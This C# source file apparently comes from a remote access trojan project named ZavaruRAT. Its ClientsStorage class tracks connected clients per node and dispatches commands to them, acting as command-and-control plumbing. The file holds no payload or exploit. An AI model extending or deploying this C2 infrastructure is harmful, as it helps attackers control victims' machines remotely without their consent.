#region

using System.Collections.Concurrent;
using System.Reactive.Linq;
using ZavaruRAT.Proto;

#endregion

namespace ZavaruRAT.Main.Runtime;

public sealed class ClientsStorage
{
    private readonly ILogger<ClientsStorage> _logger;

    private readonly ConcurrentDictionary<string, List<RemoteClient>> _clients;
    private readonly ConcurrentDictionary<string, Action<CommandEvent>> _commands;
    private event Action<CommandExecutedEvent>? CommandExecutedEvent;

    public ClientsStorage(ILogger<ClientsStorage> logger)
    {
        _logger = logger;

        _clients = new ConcurrentDictionary<string, List<RemoteClient>>();
        _commands = new ConcurrentDictionary<string, Action<CommandEvent>>();
    }

    public void AddClientsFromResync(string nodeId, IEnumerable<ClientConnectedEvent> clients)
    {
        var mappedClients = clients.Select(x => new RemoteClient(x)).ToList();

        if (_clients.ContainsKey(nodeId))
        {
            _clients.TryRemove(nodeId, out _);
        }

        _clients.AddOrUpdate(nodeId, mappedClients, (_, list) =>
        {
            list.AddRange(mappedClients);
            return list;
        });
    }

    public void AddClientFromEvent(string nodeId, ClientConnectedEvent ev)
    {
        var mappedClient = new RemoteClient(ev);

        _clients.AddOrUpdate(nodeId, _ => new List<RemoteClient> { mappedClient }, (_, list) =>
        {
            list.Add(mappedClient);
            return list;
        });
    }

    public void RemoveClientFromEvent(ClientDisconnectedEvent ev)
    {
        var (nodeId, client) = GetClient(ev.Id);

        if (client == null)
        {
            _logger.LogDebug("Trying to remove unknown client {Client} from node {Node}", ev.Id, nodeId);
            return;
        }

        var res = _clients.TryGetValue(nodeId!, out var clients);
        if (!res)
        {
            _logger.LogDebug("Trying to remove client {Client} from unknown node {Node}", ev.Id, nodeId);
            return;
        }

        clients!.Remove(client);
    }

    public void RemoveClientsFromNodeId(string nodeId)
    {
        var res = _clients.TryRemove(nodeId, out _);

        _logger.LogInformation("Remove all clients with node id {Node} result {Result}", nodeId, res);
    }

    public (string? nodeId, RemoteClient? client) GetClient(Guid id)
    {
        foreach (var (nodeId, clients) in _clients)
        {
            foreach (var client in clients)
            {
                if (client.Id == id)
                {
                    return (nodeId, client);
                }
            }
        }

        return (null, null);
    }

    public (string? nodeId, RemoteClient? client) GetClient(string id)
    {
        return GetClient(Guid.Parse(id));
    }

    public void ExecuteCommand(CommandEvent ev)
    {
        var (nodeId, client) = GetClient(ev.ClientId);

        if (client == null)
        {
            _logger.LogInformation("Trying to invoke command on unknown client {@Client}", client);
            return;
        }

        if (!_commands.ContainsKey(nodeId!))
        {
            _logger.LogInformation("Trying to invoke command on unknown node {Node}", nodeId);
            return;
        }

        _logger.LogInformation("Executing command {Command} on node {Node}", ev.Command, nodeId);

        _commands[nodeId!].Invoke(ev);
    }

    public void CommandExecuted(CommandExecutedEvent ev)
    {
        CommandExecutedEvent?.Invoke(ev);
    }

    public IObservable<CommandEvent>? GetCommands(string nodeId)
    {
        if (_commands.ContainsKey(nodeId))
        {
            _logger.LogInformation("Trying to subscribe to updates for already connected node {Node}", nodeId);
            return null;
        }

        return Observable.FromEvent<CommandEvent>(x => _commands[nodeId] = x,
                                                  x => _commands.TryRemove(nodeId, out _));
    }

    public IObservable<CommandExecutedEvent> GetCommandResults()
    {
        return Observable.FromEvent<CommandExecutedEvent>(x => CommandExecutedEvent += x,
                                                          x => CommandExecutedEvent -= x);
    }
}
